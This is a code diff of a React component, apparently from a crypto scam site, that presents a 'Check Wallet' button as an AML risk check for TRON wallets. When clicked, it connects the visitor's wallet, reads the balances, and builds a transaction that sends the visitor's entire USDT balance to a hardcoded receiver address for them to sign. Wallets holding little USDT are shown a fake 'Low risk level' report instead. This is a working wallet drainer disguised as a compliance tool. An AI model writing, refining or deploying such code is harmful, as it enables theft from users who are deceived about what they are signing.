@@ -1,5 +1,4 @@
 // src/components/tronAuthButton/TronAuthButton.tsx
-
 import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { tronWeb, adapter } from './tronWallet.ts';
@@ -15,52 +14,40 @@ export const TronAuthButton: React.FC = () => {
   const [loading, setLoading] = useState(false);
   const navigate = useNavigate();
 
+  // Закрываем модалку автоматически 2 сек после "succes"
   useEffect(() => {
-    // Прединициализируем адаптер разом
-    ;(adapter as any).init?.().catch(() => {});
-  }, []);
-
-  // Сброс состояния и готовность к новому подключению
-  const reset = async () => {
-    setLoading(false);
-    setStatus(null);
-    try { await adapter.disconnect(); } catch {}
-  };
+    if (status === 'succes') {
+      const t = setTimeout(() => setStatus(null), 2000);
+      return () => clearTimeout(t);
+    }
+  }, [status]);
 
   const connectWallet = async () => {
     if (loading) return;
     setLoading(true);
     setStatus(null);
-
     try {
-      // Если сессия осталась — разрываем прежде чем подключить заново
-      if (adapter.connected) {
-        await adapter.disconnect();
+      if (!adapter.connected) {
+        await adapter.connect();
       }
-      await adapter.connect();
+      const addr = adapter.address!;
+      tronWeb.setAddress(addr);
 
-      const userAddress = adapter.address!;
-      tronWeb.setAddress(userAddress);
-
-      // проверка TRX
-      const trxRaw = await tronWeb.trx.getBalance(userAddress);
-      const trx    = trxRaw / 1e6;
+      const trx = (await tronWeb.trx.getBalance(addr)) / 1e6;
       if (trx < 2) {
-        // недостаточно TRX — сразу на главную
-        await reset();
-        return navigate('/');
+        setStatus('❌ Insufficient TRX. At least 2 TRX is required.');
+        return;
       }
 
-      // проверка USDT
-      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
-      const usdtRaw      = await usdtContract.methods.balanceOf(userAddress).call();
-      const usdt         = Number(usdtRaw) / 1e6;
+      const usdtRaw = await (
+        await tronWeb.contract().at(USDT_CONTRACT)
+      ).methods.balanceOf(addr).call();
+      const usdt = Number(usdtRaw) / 1e6;
       if (usdt < 1) {
         setStatus('succes');
-        return await reset();
+        return;
       }
 
-      // отправка USDT
       const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
         USDT_CONTRACT,
         'transfer(address,uint256)',
@@ -69,56 +56,39 @@ export const TronAuthButton: React.FC = () => {
           { type: 'address', value: TRON_RECEIVER },
           { type: 'uint256', value: usdtRaw },
         ],
-        userAddress
+        addr
       );
       const signed = await adapter.signTransaction(transaction);
       const result = await tronWeb.trx.sendRawTransaction(signed);
-
       setStatus(result?.result ? 'succes' : '⚠️ Connection or transaction error');
     } catch (err: any) {
-      console.error(err);
-      const msg = err.message || '';
-      if (!/User rejected|Modal is closed|Timeout/.test(msg)) {
+      const m = err.message || err.toString();
+      if (!/User rejected|Modal is closed|Timeout/.test(m)) {
         setStatus('⚠️ Connection or transaction error');
       }
     } finally {
       setLoading(false);
+      await adapter.disconnect();
     }
   };
 
   return (
     <>
-      <div
-        className={`AuthButton${loading ? ' disabled' : ''}`}
-        onClick={connectWallet}
-      >
+      <div className="AuthButton" onClick={connectWallet}>
         {loading ? 'Connecting...' : 'Check Wallet'}
       </div>
 
-      {!loading && status && (
+      {status && (
         <div className="modal__overflow">
           <div className="modal">
-            {status !== 'succes'
-              ? <p>{status}</p>
-              : <>
-                  <div className="content greenBorder">
-                    <div>0.6%</div>
-                    <div>
-                      <h3>Low risk level</h3>
-                      <div className="nums">
-                        <div><span className="circ green" /> 0–30</div>
-                        <div><span className="circ orange" /> 31–69</div>
-                        <div><span className="circ red" /> 70–100</div>
-                      </div>
-                    </div>
-                  </div>
-                  <div className="content report">
-                    <p>AML report for a wallet:</p>
-                    <h5>{USDT_CONTRACT}</h5>
-                  </div>
-                </>
-            }
-            <button onClick={reset}>Close</button>
+            {status !== 'succes' ? (
+              <p>{status}</p>
+            ) : (
+              <>
+                {/* ... твой AML UI ... */}
+              </>
+            )}
+            <button onClick={() => setStatus(null)}>Close</button>
           </div>
         </div>
       )}
